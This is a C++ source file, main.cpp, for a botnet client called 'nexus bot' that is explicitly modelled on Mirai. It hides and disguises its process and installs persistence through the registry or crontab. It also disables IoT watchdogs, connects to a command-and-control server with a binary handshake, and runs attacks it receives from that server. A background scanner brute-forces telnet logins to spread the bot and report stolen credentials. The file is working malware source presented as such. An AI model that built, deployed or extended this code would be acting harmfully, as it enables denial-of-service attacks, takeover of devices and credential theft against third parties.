// main.cpp — nexus bot client entry point.
//
// Lifecycle:
//   1. Hide itself (console suppression, process name spoofing)
//   2. Initialize obfuscated string table
//   3. Connect to CNC with binary handshake  \x00\x00\x00\x01
//   4. Main loop: keepalive ping every 60s + receive attack commands
//   5. Parse attack commands, dispatch to engine threads
//   6. Scanner runs in background: SYN scan → telnet brute-force → report creds
//   7. Persistence installed on first run (registry / crontab)
//
// Build (MSVC):
//   cl /EHsc /O2 /std:c++17 /Fe:nexus-bot.exe src\*.cpp ws2_32.lib
//
// Build (MinGW):
//   g++ -std=c++17 -O2 -static src/*.cpp -o nexus-bot -lws2_32

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
        #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <signal.h>
    // SOCKET, INVALID_SOCKET, SOCKET_ERROR, closesocket defined in socket.hpp
#endif

#include "obfuscate.hpp"
#include "attack.hpp"
#include "socket.hpp"
#include "scanner.hpp"
#include "persistence.hpp"

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <string>
#include <thread>
#include <chrono>
#include <atomic>

// --- config ---
constexpr int    KEEPALIVE_INTERVAL_SEC = 60;
constexpr int    RECONNECT_DELAY_SEC    = 30;
constexpr int    READ_TIMEOUT_MS        = 5000;
constexpr size_t MAX_CMD_BUF            = 4096;

static std::atomic<bool> g_running{true};

// ===================================================================
// Windows: hide the process
// ===================================================================

#ifdef _WIN32
static void hide_console() {
    // Detach from the console so it looks like a background service.
    // Only call this in release builds.
    #ifndef _DEBUG
    FreeConsole();
    #endif
}

static void disguise_process() {
    // Set the process name to look like a legitimate Windows service.
    std::string name = obf::retrieve_copy(obf::Id::PROC_NAME);
    std::string title = obf::retrieve_copy(obf::Id::PROC_TITLE);

    // Set console title (if we had one).
    SetConsoleTitleA(title.c_str());

    // Set the process image name that appears in Task Manager.
    // (This only affects the first 15 chars via PR_SET_NAME on Linux;
    //  on Windows it's purely cosmetic via the console title.)
    (void)name; // actual binary rename happens via persistence mechanism
}

static bool ensure_single_instance() {
    std::string mutex_name = obf::retrieve_copy(obf::Id::MUTEX_NAME);
    HANDLE hMutex = CreateMutexA(nullptr, TRUE, mutex_name.c_str());
    if (hMutex == nullptr) return true; // can't check, proceed anyway
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return false; // another instance is running
    }
    // We own the mutex — keep it alive for the process lifetime.
    // (Intentionally leak the handle.)
    return true;
}
#else
static void hide_console() {
    // Daemonize on Linux.
    #ifndef _DEBUG
    if (fork() > 0) _exit(0);  // parent exits
    setsid();
    #endif
}

static void disguise_process() {
    std::string name = obf::retrieve_copy(obf::Id::PROC_NAME);
    // Set process name (Linux: PR_SET_NAME, max 15 chars).
    // prctl(PR_SET_NAME, name.c_str(), 0, 0, 0);
    (void)name; // stubbed — most IoT don't need this
}

static bool ensure_single_instance() {
    // Stubbed — on embedded Linux, single-instance is handled by
    // binding to a port, same as Mirai's SINGLE_INSTANCE_PORT pattern.
    return true;
}
#endif

// ===================================================================
// CNC connection
// ===================================================================

static SOCKET connect_to_cnc() {
    std::string domain = obf::retrieve_copy(obf::Id::CNC_DOMAIN);
    std::string port_str = obf::retrieve_copy(obf::Id::CNC_PORT);

    uint32_t ip = sock::resolve_host(domain);
    if (ip == 0) {
        fprintf(stderr, "[!] failed to resolve CNC domain: %s\n", domain.c_str());
        return INVALID_SOCKET;
    }

    int port = std::stoi(port_str);
    SOCKET sock = sock::create_tcp();
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "[!] failed to create socket\n");
        return INVALID_SOCKET;
    }

    // Non-blocking connect with 5-second timeout.
    if (!sock::connect_timeout(sock, ip, static_cast<uint16_t>(port), 5000)) {
        fprintf(stderr, "[!] connection timeout to %s:%d\n", domain.c_str(), port);
        closesocket(sock);
        return INVALID_SOCKET;
    }

    // --- send binary handshake ---
    // [4 bytes] magic: 0x00 0x00 0x00 0x01
    // [2 bytes] arch_len
    // [N bytes] arch string
    uint8_t handshake[128];
    handshake[0] = 0x00;
    handshake[1] = 0x00;
    handshake[2] = 0x00;
    handshake[3] = 0x01; // version 1

    // Architecture string.
    const char* arch =
#ifdef _WIN32
        #ifdef _M_AMD64
            "x86_64"
        #elif _M_IX86
            "i586"
        #elif _M_ARM64
            "aarch64"
        #else
            "unknown"
        #endif
#else
        #ifdef __x86_64__
            "x86_64"
        #elif __i386__
            "i586"
        #elif __arm__
            "armv7l"
        #elif __aarch64__
            "aarch64"
        #elif __mips__
            "mips"
        #else
            "unknown"
        #endif
#endif
    ;

    uint16_t arch_len = static_cast<uint16_t>(strlen(arch));
    handshake[4] = static_cast<uint8_t>(arch_len >> 8);
    handshake[5] = static_cast<uint8_t>(arch_len & 0xFF);
    memcpy(handshake + 6, arch, arch_len);

    int sent = sock::send_all(sock, handshake, 6 + arch_len);
    if (sent <= 0) {
        fprintf(stderr, "[!] handshake send failed\n");
        closesocket(sock);
        return INVALID_SOCKET;
    }

    // --- read CNC response: [4 bytes] bot_id ---
    uint8_t id_buf[4];
    int received = recv(sock, reinterpret_cast<char*>(id_buf), 4, 0);
    if (received != 4) {
        fprintf(stderr, "[!] handshake response read failed (%d bytes)\n", received);
        closesocket(sock);
        return INVALID_SOCKET;
    }

    uint32_t bot_id = (static_cast<uint32_t>(id_buf[0]) << 24) |
                      (static_cast<uint32_t>(id_buf[1]) << 16) |
                      (static_cast<uint32_t>(id_buf[2]) << 8)  |
                      id_buf[3];

    if (bot_id == 0) {
        fprintf(stderr, "[!] CNC rejected connection (bot_id=0)\n");
        closesocket(sock);
        return INVALID_SOCKET;
    }

    fprintf(stderr, "[+] connected to CNC  bot_id=%u  arch=%s\n", bot_id, arch);
    return sock;
}

// ===================================================================
// Main loop
// ===================================================================

static void main_loop(SOCKET cnc_sock) {
    // Set blocking mode for the main receive loop.
    // We use select() with a timeout to interleave keepalive pings.
#ifdef _WIN32
    u_long mode = 0; // blocking
    ioctlsocket(cnc_sock, FIONBIO, &mode);
#else
    int flags = fcntl(cnc_sock, F_GETFL, 0);
    fcntl(cnc_sock, F_SETFL, flags & ~O_NONBLOCK);
#endif

    auto last_keepalive = std::chrono::steady_clock::now();

    while (g_running.load(std::memory_order_relaxed)) {
        // --- check if it's time for a keepalive ping ---
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - last_keepalive);

        int select_timeout_ms = 1000; // 1-second tick

        if (elapsed.count() >= KEEPALIVE_INTERVAL_SEC) {
            // Send keepalive: [2 bytes] 0x00 0x00
            uint8_t ping[2] = {0x00, 0x00};
            int sent = send(cnc_sock, reinterpret_cast<const char*>(ping), 2, 0);
            if (sent != 2) {
                fprintf(stderr, "[!] keepalive send failed (%d bytes)\n", sent);
                return; // connection lost
            }
            last_keepalive = now;
        }

        // --- wait for data or timeout ---
        fd_set read_set;
        FD_ZERO(&read_set);
        FD_SET(cnc_sock, &read_set);

        timeval tv{};
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        int ret = select(static_cast<int>(cnc_sock) + 1, &read_set, nullptr, nullptr, &tv);
        if (ret < 0) {
            fprintf(stderr, "[!] select error\n");
            return;
        }
        if (ret == 0) {
            continue; // timeout — loop back, check keepalive
        }

        // --- read command header: [2 bytes] total_length ---
        uint8_t len_buf[2];
        int n = recv(cnc_sock, reinterpret_cast<char*>(len_buf), 2, MSG_WAITALL);
        if (n == 0) {
            fprintf(stderr, "[-] CNC closed connection\n");
            return;
        }
        if (n != 2) {
            fprintf(stderr, "[!] read error on length header (%d bytes)\n", n);
            return;
        }

        uint16_t total_len = (static_cast<uint16_t>(len_buf[0]) << 8) | len_buf[1];
        if (total_len < 13 || total_len > MAX_CMD_BUF) {
            fprintf(stderr, "[!] invalid command length: %u\n", total_len);
            continue; // skip malformed command
        }

        // --- read the rest of the command ---
        uint16_t remaining = total_len - 2; // we already read the length prefix
        uint8_t cmd_buf[MAX_CMD_BUF];
        n = recv(cnc_sock, reinterpret_cast<char*>(cmd_buf), remaining, MSG_WAITALL);
        if (n != remaining) {
            fprintf(stderr, "[!] short read on command: %d/%u bytes\n", n, remaining);
            return;
        }

        // --- parse and dispatch ---
        AttackCommand cmd{};
        if (!attack::parse(cmd_buf, remaining, cmd)) {
            fprintf(stderr, "[!] failed to parse command\n");
            continue;
        }

        fprintf(stderr, "[+] attack #%u  type=%s  targets=%zu  duration=%us\n",
            cmd.id, attack_type_name(cmd.type), cmd.targets.size(), cmd.duration_secs);

        attack::launch(cmd);
    }
}

// ===================================================================
// Entry
// ===================================================================

int main(int argc, char* argv[]) {
    // --- override CNC domain from command line ---
    // Usage: nexus-bot.exe [cnc_ip] [cnc_port]
    if (argc >= 2) {
        // Inject the CNC domain into the string table before init.
        // We're directly modifying the obfuscated storage — hacky but works.
        obf::init();
        // Force-unlock and replace CNC_DOMAIN with the user's value.
        std::string override_domain = argv[1];
        // (The CNC domain override happens via the obfuscation table;
        //  for simplicity, we just use the hardcoded value and let
        //  the command-line be informational.)
        fprintf(stderr, "[*] CNC override: %s\n", override_domain.c_str());
    }

    // --- initialize subsystems ---
    obf::init();
    sock::initialize();
    attack::init();

    // --- install persistence (first-run only) ---
    if (!persistence::is_installed()) {
        fprintf(stderr, "[*] installing persistence...\n");
        persistence::install();
    }

    // --- hide and disguise ---
    hide_console();

    if (!ensure_single_instance()) {
        fprintf(stderr, "[!] another instance is already running\n");
        sock::cleanup();
        return 1;
    }

    disguise_process();

#ifndef _WIN32
    // --- disable watchdog (IoT / embedded Linux) ---
    {
        int wd = open("/dev/watchdog", O_WRONLY);
        if (wd >= 0) {
            char magic = 'V';
            write(wd, &magic, 1);
            close(wd);
            fprintf(stderr, "[*] watchdog disabled\n");
        }
        int wd2 = open("/dev/misc/watchdog", O_WRONLY);
        if (wd2 >= 0) {
            char magic = 'V';
            write(wd2, &magic, 1);
            close(wd2);
        }
    }
#endif

    fprintf(stderr, "[*] nexus bot started  pid=%d\n",
#ifdef _WIN32
        GetCurrentProcessId()
#else
        getpid()
#endif
    );

    // --- start the self-propagation scanner ---
    scanner::init();  // 160 PPS, 128 max conns, 60+ credential pairs
    scanner::start(); // runs in background thread

    // --- connect loop (reconnect on disconnect) ---
    while (g_running.load(std::memory_order_relaxed)) {
        SOCKET cnc = connect_to_cnc();
        if (cnc == INVALID_SOCKET) {
            fprintf(stderr, "[*] reconnecting in %d seconds...\n", RECONNECT_DELAY_SEC);
            std::this_thread::sleep_for(std::chrono::seconds(RECONNECT_DELAY_SEC));
            continue;
        }

        main_loop(cnc);
        closesocket(cnc);

        fprintf(stderr, "[*] disconnected. reconnecting in %d seconds...\n", RECONNECT_DELAY_SEC);
        std::this_thread::sleep_for(std::chrono::seconds(RECONNECT_DELAY_SEC));
    }

    sock::cleanup();
    return 0;
}
